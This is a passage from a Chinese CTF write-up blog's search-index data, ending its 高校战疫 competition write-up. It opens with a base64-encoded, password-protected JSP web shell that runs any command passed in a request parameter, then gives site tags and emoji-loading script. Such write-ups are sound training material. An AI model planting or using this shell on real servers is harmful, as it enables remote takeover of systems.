PCUKICAgIGlmKCIwMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiaSIpKS5nZXRJbnB1dFN0cmVhbSgpOwogICAgICAgIGludCBhID0gLTE7CiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsyMDQ4XTsKICAgICAgICBvdXQucHJpbnQoIjxwcmU+Iik7CiAgICAgICAgd2hpbGUoKGE9aW4ucmVhZChiKSkhPS0xKXsKICAgICAgICAgICAgb3V0LnByaW50bG4obmV3IFN0cmluZyhiKSk7CiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9CiU+|base64 -d`\" 连接后在根目录可以发现 flag easyweb待更新 happyvacation待更新 本文作者: cjm00n本文地址: https://cjm00n.top/CTF/高校战疫分享赛Writeup.html 版权声明: 除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","link":"/CTF/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E5%88%86%E4%BA%AB%E8%B5%9BWriteup.html"}],"tags":[{"name":"AWD","slug":"AWD","link":"/tags/AWD/"},{"name":"Writeup","slug":"Writeup","link":"/tags/Writeup/"},{"name":"Config","slug":"Config","link":"/tags/Config/"},{"name":"Web开发","slug":"Web开发","link":"/tags/Web%E5%BC%80%E5%8F%91/"},{"name":"CSRF","slug":"CSRF","link":"/tags/CSRF/"},{"name":"HackTheBox","slug":"HackTheBox","link":"/tags/HackTheBox/"},{"name":"Script","slug":"Script","link":"/tags/Script/"}],"categories":[{"name":"CTF","slug":"CTF","link":"/categories/CTF/"},{"name":"Linux","slug":"Linux","link":"/categories/Linux/"},{"name":"Web","slug":"Web","link":"/categories/Web/"},{"name":"Pentest","slug":"Pentest","link":"/categories/Pentest/"},{"name":"Blog","slug":"Blog","link":"/categories/Blog/"}]}